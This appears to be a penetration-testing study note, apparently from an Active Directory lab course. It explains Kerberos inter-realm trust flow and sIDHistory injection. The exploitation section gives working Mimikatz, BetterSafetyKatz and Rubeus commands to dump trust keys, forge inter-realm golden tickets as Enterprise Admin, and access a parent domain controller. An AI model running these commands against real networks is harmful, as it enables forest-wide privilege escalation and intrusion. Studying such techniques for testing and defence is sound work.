# Trusts

## Trust Flow

The Diagram below shows how Client from trusted domain can ask for access to other Domain's service.

We can see that in order to allow access to the service hosted on Domain B, a TGT is returned within a TGS-REP signed with the **Inter-Realm Trust Key**.

<img src="../../.gitbook/assets/file.excalidraw (2).svg" alt="" class="gitbook-drawing">

1. Client on behalf of the user send an encrypted (with user's AES Keys) timestamp to the DC (maybe child DC) - AS-REQ
2. DC (Child DC) then validates it and responds with a TGT - AS-REP
3. Then when the machine requests for a TGS i.e, SPN of a different domain (Domain B/Parent Domain)&#x20;
4. **Since the DC (Child DC) can't issue it directly, it'll respond with something called as Inter-realm TGT encrypted with a trust key i.e, since the DC (Child DC) doesn't have direct access to service (SPN) that is requested by the machine and if the SPN is in it's realm (trust zone) then it'll issue the Inter-realm TGT encrypted with a Trust Key**
5. <mark style="color:red;">Then machine sends this Inter-realm TGT to the other domain (Domain B/Parent DC)</mark>
   1. <mark style="color:red;">Here the DC only checks if it can decrypt the Inter-realm TGT with the Trust key it has, so if an attacker can craft an inter-realm TGT with the trust key, they can request TGS for any service on the forest.</mark>
6. Then machine then receives the requested TGS

Same explanation with diff diag: [#trust-flow-inter-realm-tgt](../../misc/theory/concepts.md#trust-flow-inter-realm-tgt "mention")

## **sIDHistory Injection:**&#x20;

* Priv Esc a Domain Admin to Enterprise Admin
* sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
* sIDHistory can be abused in two ways of escalating privileges within a forest:
  * krbtgt hash of the child
  * Trust tickets

## Exploitation

It is possible to exploit the TGS REQ (marked red in the diagram above) by forging new TGT using the trust key.

### Get the trust key

The trust key is required to forge the Inter-Realm TGT. - To be executed on the DC (Child DC/Domain we have control over)

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'   # Here dcorp\mcrop$ is the Trust account, so it's NTLM hash would be the trust key
```
{% endcode %}

### Forge the Inter-Realm TGT

Note that krbtgt can be used instead of the trust key.

{% code overflow="wrap" %}
```powershell
# Child to parent 
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

# Using krbtgt hash - No need to request for tgs later
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"

# Across Forest
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit" 
```
{% endcode %}

| Options   | Text                                                                      |
| --------- | ------------------------------------------------------------------------- |
| /domain:  | FQDN of the current domain                                                |
| /sid:     | SID of the current domain                                                 |
| /sids:    | SID to be injected to the SID History - 519 is the "Enterprise Admin" RID |
| /rc4:     | RC4 of the trust key                                                      |
| /krbtgt:  | krbtgt hash can be used instead of the Trust Key                          |
| /user:    | User to impersonate                                                       |
| /service: | Target service in the parent domain                                       |
| /target:  | FQDN of the parent domain                                                 |
| /ticket:  | Path to save the ticket                                                   |

### Request the TGS and pass it

{% code overflow="wrap" %}
```powershell
Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorpdc.moneycorp.local /ptt

ls \\mcorp-dc.moneycorp.local\c$

# Using kekeo
# Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-
dc.moneycorp.local
# Use the TGS to access the targeted service.
.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$

# Tickets for other services (like HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM) can be created as well.
```
{% endcode %}
